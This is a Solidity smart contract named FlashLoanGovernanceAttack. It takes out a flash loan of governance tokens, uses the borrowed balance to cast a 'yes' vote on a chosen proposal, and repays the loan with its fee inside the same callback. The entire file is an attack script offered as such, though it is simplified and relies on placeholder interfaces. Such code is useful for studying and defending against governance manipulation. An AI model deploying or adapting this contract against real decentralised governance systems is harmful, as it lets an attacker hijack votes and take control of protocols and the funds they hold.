// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ✅ Declare the missing FlashLoan provider interface
interface IFlashLoanProvider {
    function executeFlashLoan(uint256 amount) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGovernance {
    function vote(uint256 proposalId, bool support) external;
    function proposalToken() external view returns (address);
}

/**
 * @title FlashLoanGovernanceAttack
 * @dev Executes a flash loan to gain temporary voting power in a governance system.
 */
contract FlashLoanGovernanceAttack {
    IGovernance public governance;
    IFlashLoanProvider public provider;
    IERC20 public govToken;
    uint256 public proposalId;
    address public attacker;

    constructor(address _provider, address _gov, uint256 _proposalId) {
        provider = IFlashLoanProvider(_provider);
        governance = IGovernance(_gov);
        govToken = IERC20(governance.proposalToken());
        proposalId = _proposalId;
        attacker = msg.sender;
    }

    function attack(uint256 amount) external {
        require(msg.sender == attacker, "Only attacker can initiate");
        provider.executeFlashLoan(amount);
    }

    function executeOnFlashLoan(uint256 amount, uint256 fee) external {
        require(msg.sender == address(provider), "Only provider");

        // Assume token-based voting power
        govToken.approve(address(governance), amount);
        governance.vote(proposalId, true); // vote yes

        // Return loan
        govToken.transfer(address(provider), amount + fee);
    }
}
